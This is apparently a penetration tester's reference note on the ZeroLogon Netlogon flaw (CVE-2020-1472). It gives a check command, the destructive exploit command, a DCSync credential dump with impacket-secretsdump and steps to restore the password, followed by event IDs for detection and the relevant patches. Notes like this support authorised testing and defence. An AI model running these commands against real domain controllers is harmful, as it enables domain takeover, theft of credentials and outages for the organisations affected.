---
tags: [pentest, zerologon, cve-2020-1472, ad, active-directory, initial-access, windows]
phase: 5
---
# ZeroLogon (CVE-2020-1472)

Crypto flaw in Netlogon: any unauthenticated network user can reset the machine-account password of a DC to empty, then DCSync.

[[06 - Gaining Access/00 - README|Folder index]]

## Affected

- Windows Server 2008 R2 / 2012 / 2012 R2 / 2016 / 2019 (un-patched).
- Patched: August 2020 + February 2021 enforcement update.

## Check (read-only, safe)

```bash
python3 zerologon_tester.py <DC_NETBIOS_NAME> <DC_IP>
# "Success! Target is vulnerable."  → vulnerable but NOT exploited yet
```

## Exploit (DESTRUCTIVE - resets DC machine password)

```bash
python3 cve-2020-1472-exploit.py <DC_NETBIOS_NAME> <DC_IP>
```

After exploit, the DC's machine-account password becomes empty:

```bash
# DCSync with empty hash
impacket-secretsdump -just-dc -no-pass <DC_NETBIOS_NAME>\$@<DC_IP>
# That \$ is the machine account name (note the backslash + dollar)
```

## CRITICAL: Restore the machine password after

ZeroLogon resets the DC's machine account password to empty. This BREAKS the domain (replication, Group Policy, etc.) until restored. You must restore it before disengaging:

```bash
# Extract from registry-saved hives BEFORE exploit (if you have prior access)
secretsdump -sam SAM -system SYSTEM LOCAL

# Or: dump the machine account password BEFORE running exploit
# (DC's $MACHINE.ACC entry in LSA secrets)

# Restore script
python3 reinstall_original_pw.py <DC_NETBIOS> <DC_IP> <ORIGINAL_HEX_PASSWORD>
```

> [!danger] DO NOT RUN ON PRODUCTION WITHOUT RESTORE PLAN
> Failure to restore the machine password will cause domain replication/auth failures, requiring manual recovery. Always test in lab first, capture the original password, and have the restore script ready.

## Workflow (safe order)

```text
1. zerologon_tester.py - confirm vulnerable, no changes made
2. Get DA via OTHER means if possible (ZL is destructive; use only if necessary)
3. If ZL is needed:
     a. Save DC's machine pw beforehand if you have admin
     b. Run exploit
     c. DCSync krbtgt + admin
     d. Restore machine pw IMMEDIATELY
     e. Verify domain replication healthy (repadmin /showrepl)
```

## Detection

- Event ID **4742** "A computer account was changed" for DC objects.
- Event ID **5805** Netlogon errors on member servers.
- Anomalous Netlogon sequence numbers in DC logs.

## Mitigation

- Apply August 2020 + Feb 2021 patches.
- Enforce signed Netlogon channel (default after Feb 2021 enforcement).

> [!warning] Real engagements
> Always notify the client BEFORE running ZeroLogon, even with restore scripts. The risk of an outage is real. On HTB it's free; on prod, get explicit written approval first.
